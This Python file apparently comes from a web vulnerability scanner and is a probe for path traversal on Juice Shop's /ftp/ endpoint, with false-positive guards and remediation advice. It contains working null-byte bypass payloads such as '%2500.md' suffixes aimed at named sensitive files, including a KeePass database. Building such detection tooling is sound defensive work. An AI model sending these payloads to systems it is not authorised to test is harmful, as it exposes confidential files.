#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Path traversal: known sensitive files reachable through the FTP
download handler via either .bak suffix or %2500.md null-byte bypass.

Companion to `path_traversal_extension_bypass`. That probe targets
the GENERIC null-byte trick and walks a small synthetic catalogue;
this one targets the SPECIFIC Juice Shop sensitive files (coupons,
suspicious_errors.yml, package.json.bak) at /ftp/. It exists so a
finding can name the *file* exposed rather than the technique
class — separately useful for incident-response timelines.

Detection signal:
  GET /ftp/coupons_2013.md.bak%2500.md → 200 with non-markdown body
  matching a content signature for that specific file.

False-positive defenses (added after a real false-positive on a host
that 303'd /ftp/* to /login):
  - Redirects are NOT followed; any 3xx surfaces as the response and
    is rejected (a redirect to a login page is not the file).
  - The response Content-Type must not be text/html (Juice Shop's
    files are text/plain or application/octet-stream).
  - The response's effective URL must equal the requested URL (no
    silent walk through a redirect chain).
  - Per-file validators look for *file-specific* shape (KDBX magic
    bytes, package.json keys, multi-line base64) rather than a loose
    catch-all regex.
"""
from __future__ import annotations

import re
import sys
from pathlib import Path
from typing import Callable, Optional, Tuple
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402


# ---------- per-file content validators -----------------------------------
# Each validator receives the decoded text and the raw bytes and returns
# True only when the response looks like the SPECIFIC file we're hunting.
# The bar is "would a human looking at this body say 'yep, that's it'" —
# tight enough that an HTML login page or a generic 404 page never
# matches, loose enough that minor format drift in Juice Shop builds
# still does.

def _is_juice_coupons(text: str, body: bytes) -> bool:
    """Juice Shop's coupons file is multiple short base64-shaped lines,
    one coupon per line. Require ≥5 such lines with no other content
    so that an HTML page (which has only sporadic base64-runs inside
    much larger non-base64 markup) cannot match."""
    if not text or "<html" in text.lower() or "<form" in text.lower():
        return False
    base64_lines = 0
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        # Each non-empty line must be ENTIRELY base64-shaped to count;
        # a stray line of HTML kills the match.
        if not re.fullmatch(r"[A-Za-z0-9+/=]{16,}", line):
            return False
        base64_lines += 1
    return base64_lines >= 5


def _is_juice_errors_yml(text: str, body: bytes) -> bool:
    """suspicious_errors.yml — YAML-shaped error log. Either contains a
    SQLite error keyword (the canonical content) OR has at least three
    YAML list bullets at the start of lines."""
    if not text or "<html" in text.lower():
        return False
    if "SQLITE_ERROR" in text or "cannot find module" in text:
        return True
    bullets = sum(1 for ln in text.splitlines() if ln.startswith("- "))
    return bullets >= 3


def _is_juice_package_json_bak(text: str, body: bytes) -> bool:
    """package.json backup — must look like a real package.json
    (has BOTH "dependencies" and "version" keys). One key alone could
    appear in any JSON config; both together is package.json-shaped."""
    if not text or "<html" in text.lower():
        return False
    return ('"dependencies"' in text) and ('"version"' in text)


def _is_juice_kdbx(text: str, body: bytes) -> bool:
    """KeePass KDBX file — magic header bytes 03 D9 A2 9A. Both KDBX
    3.x and 4.x share this prefix, so anchoring on the first four bytes
    avoids both HTML and ASCII false positives."""
    return bool(body) and body.startswith(b"\x03\xd9\xa2\x9a")


# (path-relative-to-/ftp, body-validator, what-it-is)
JUICE_FILES: Tuple[Tuple[str, Callable[[str, bytes], bool], str], ...] = (
    ("coupons_2013.md.bak%2500.md",   _is_juice_coupons,
     "encoded coupon list"),
    ("suspicious_errors.yml%2500.md", _is_juice_errors_yml,
     "internal error log"),
    ("package.json.bak%2500.md",      _is_juice_package_json_bak,
     "Node package backup"),
    ("incident-support.kdbx%2500.md", _is_juice_kdbx,
     "KeePass database (binary marker)"),
)


def _response_disqualified(r, requested_url: str) -> Optional[str]:
    """Return None when the response could plausibly be the target
    file, else a short reason describing why it is not. Centralizes the
    "this is clearly not the file" guards so every JUICE_FILES entry
    benefits from the same protection without restating it."""
    if r.status != 200:
        return f"status={r.status}"
    if not r.body:
        return "empty body"
    # follow_redirects=False is requested below, but cross-check anyway:
    # if final_url drifted from the request URL, urllib followed
    # something we didn't intend.
    if r.final_url and r.final_url != requested_url:
        return f"redirected to {r.final_url}"
    ctype = (r.headers.get("content-type")
             or r.headers.get("Content-Type") or "").lower()
    if "text/html" in ctype or "application/xhtml" in ctype:
        return f"content-type={ctype} (HTML, not a file dump)"
    return None


class PathTraversalFtpDownloadProbe(Probe):
    name = "path_traversal_ftp_download"
    summary = ("Detects named-file path-traversal via /ftp/ using "
               "%2500.md and .bak.md tricks.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--filename", action="append", default=[],
            help="Additional `path|regex|description` triple "
                 "(repeatable). The regex is applied to the response "
                 "text in MULTILINE mode; same disqualification "
                 "guards apply (no 3xx, no text/html, etc.).")

    def _validator_from_regex(self, body_re: str) -> Callable[[str, bytes], bool]:
        """Wrap a user-supplied regex into the same (text, body) -> bool
        contract the built-in validators use. Kept separate so the
        built-in checks stay tight even when ad-hoc CLI users add a
        looser pattern."""
        compiled = re.compile(body_re, re.MULTILINE)

        def _check(text: str, body: bytes) -> bool:
            if not text or "<html" in text.lower():
                return False
            return bool(compiled.search(text)
                        or compiled.search(body.decode("latin-1", "replace")))
        return _check

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        targets = list(JUICE_FILES)
        for spec in (args.filename or []):
            try:
                p, rx, desc = spec.split("|", 2)
                targets.append((p, self._validator_from_regex(rx), desc))
            except ValueError:
                pass

        attempts: list[dict] = []
        confirmed: list[dict] = []
        for fn, validator, what in targets:
            url = urljoin(origin, f"/ftp/{fn}")
            # follow_redirects=False is the load-bearing change here:
            # without it, a 303 to /login is silently walked and the
            # login page (status 200, ~1k of HTML) is what every
            # validator below would see.
            r = client.request("GET", url, follow_redirects=False)
            row: dict = {"file": fn, "url": url, "what": what,
                         "status": r.status, "size": r.size}
            disq = _response_disqualified(r, url)
            if disq:
                row["rejected"] = disq
                attempts.append(row)
                continue
            if validator(r.text or "", r.body or b""):
                row["leaked"] = True
                confirmed.append(row)
                attempts.append(row)
                break
            row["body_mismatch"] = True
            attempts.append(row)

        evidence = {"origin": origin, "attempts": attempts}
        if confirmed:
            top = confirmed[0]
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: /ftp traversal at "
                         f"{origin}/ftp/{top['file']} returned the "
                         f"{top['what']} ({top['size']} bytes)."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="high",
                remediation=(
                    "Move the FTP-style backup directory out of the "
                    "document root. If files in /ftp must remain "
                    "served, decode the URL BEFORE the extension "
                    "check (so %00 truncation is caught) and refuse "
                    "any path containing a NUL byte. Audit /ftp's "
                    "contents — anything an attacker could have "
                    "fetched during the exposure window is now "
                    "potentially in the wild."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tested {len(attempts)} known-name FTP "
                     f"files on {origin}; none leaked their content."),
            evidence=evidence,
        )


if __name__ == "__main__":
    PathTraversalFtpDownloadProbe().main()
